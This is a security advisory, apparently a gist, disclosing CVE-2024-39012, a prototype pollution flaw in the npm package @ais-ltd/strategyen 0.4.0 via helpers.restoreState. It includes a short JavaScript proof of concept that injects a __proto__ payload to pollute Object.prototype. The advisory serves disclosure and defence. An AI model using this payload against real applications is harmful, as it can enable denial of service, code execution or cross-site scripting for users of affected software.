[CVE-2024-39012] Vulnerability Advisory in Prototype Pollution in @ais-ltd/strategyen, version 0.4.0

 [Raw](/mestrtee/acfbd724a4b73bfb5d030575b653453c/raw/a6424a10d333f290e00d977ddd0a5467537e0ba1/Advisory_ais-ltd.md)

[**Advisory\_ais-ltd.md**](#file-advisory_ais-ltd-md)

**Vulnerability type:**
Prototype Pollution

**Vendor of the Package:**
ais-ltd

**Affected Package:**

* Product: @ais-ltd/strategyen
* Version: 0.4.0

**Affected component(s):**

```
helpers.restoreState
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `helpers.restoreState` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `helpers.restoreState`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('@ais-ltd/strategyen');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.helpers.restoreState (JSON.parse('{"__proto__":{"test":123}}'))

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.polluted;

  })();
```
